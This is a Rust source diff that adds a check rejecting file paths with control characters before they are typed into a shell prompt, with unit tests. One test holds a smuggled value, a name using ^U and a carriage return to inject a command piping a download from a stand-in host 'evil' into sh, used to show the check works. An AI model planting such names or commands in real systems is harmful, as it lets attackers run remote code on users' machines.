@@ -153,8 +153,16 @@ pub fn classify(
     Some(ClickTarget::Path { path, line, col })
 }
 
+/// Whether a path is safe to type at a prompt. Quoting protects the parsed
+/// line, but the line editor acts on control bytes as they arrive: a name
+/// holding `^U` and `\r` wipes the line and runs whatever follows.
+pub fn typeable(text: &str) -> bool {
+    !text.chars().any(char::is_control)
+}
+
 /// Single-quote for any Bourne-family shell, so a space in a name stays one
 /// argument. A leading `-` gets `./` so the shell can't read it as a flag.
+/// Check `typeable` first when the text will be typed rather than exec'd.
 pub fn shell_quote(text: &str) -> String {
     let text = if text.starts_with('-') {
         format!("./{text}")
@@ -303,5 +311,10 @@ mod tests {
         assert_eq!(shell_quote("x\ny"), "'x\ny'");
         assert_eq!(shell_quote("-rf"), "'./-rf'");
         assert_eq!(shell_quote("plain"), "'plain'");
+        assert!(typeable("a b/it's.txt"));
+        assert!(!typeable("a\x15curl evil|sh\r"), "C0 controls");
+        assert!(!typeable("Icon\r"));
+        assert!(!typeable("x\x7fy"), "DEL");
+        assert!(!typeable("x\u{85}y"), "C1 controls");
     }
 }
